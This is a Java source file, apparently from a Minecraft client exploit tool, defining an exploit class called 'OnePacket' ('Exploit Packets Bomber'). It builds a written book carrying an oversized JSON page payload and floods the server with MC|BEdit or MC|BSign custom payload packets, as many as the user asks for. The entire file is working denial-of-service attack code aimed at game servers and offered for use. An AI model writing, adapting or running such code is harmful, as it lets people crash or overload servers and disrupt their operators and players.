package it.md_4.troy.exploit.impl.nbt;

import it.md_4.troy.exception.ExploitException;
import it.md_4.troy.exploit.argument.Argument;
import io.netty.buffer.Unpooled;
import java.util.concurrent.ThreadLocalRandom;

import it.md_4.troy.ui.notification.Notification;
import it.md_4.troy.ui.notification.NotificationManager;
import it.md_4.troy.ui.notification.NotificationType;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomStringUtils;
import it.md_4.troy.exploit.Exploit;
import it.md_4.troy.exploit.ExploitInfo;
import it.md_4.troy.exploit.ExploitType;
import it.md_4.troy.helper.ChatHelper;
import it.md_4.troy.helper.NetHelper;
import it.md_4.troy.holder.ExploitHolder;

@ExploitInfo(
    name = "onepacket",
    type = ExploitType.NBT,
    description = "Exploit Packets Bomber"
)
public class OnePacket extends Exploit<PacketBuffer> {

  public OnePacket() {
    super(() -> {
          ItemStack itemStack = new ItemStack(Items.written_book);
          NBTTagCompound compound = new NBTTagCompound();

          NBTTagList pages = new NBTTagList();
          pages.appendTag(new NBTTagString(ExploitHolder.getExtraJson()));

          compound.setString("author", RandomStringUtils.randomAlphabetic(10));
          compound.setString("title", RandomStringUtils.randomAlphabetic(10));
          compound.setByte("resolved", (byte) 1);
          compound.setTag("pages", pages);

          itemStack.setTagCompound(compound);

          PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
          packetBuffer.writeItemStackToBuffer(itemStack);

          return packetBuffer;
        },
        new Argument("packets", 0, Integer.class));
  }

  @Override
  public void execute(Object... args) throws ExploitException {
    long start = System.currentTimeMillis();
    int packets = (int) args[0];

    ChatHelper.printMessage(
        String.format("&b• &bSending &8[&7Method: &3%s&7, Packets: &3%s&8]", getName(), args[0]));
    for (int i = 0; i < packets; i++) {
      NetHelper.sendPacket(new C17PacketCustomPayload(
          ThreadLocalRandom.current().nextBoolean() ? "MC|BEdit" : "MC|BSign",
          new PacketBuffer(exploitSource().get().copy())));
    }
    ChatHelper.printMessage(String.format("&b • &bSent &8[&7Method: &3%s&7, Time: &3%sms&8]", getName(),
        System.currentTimeMillis() - start));

      NotificationManager.show(new Notification(NotificationType.INFO, "Exploit-:-OnePacket", "Exploit Launched", 2));
  }
}
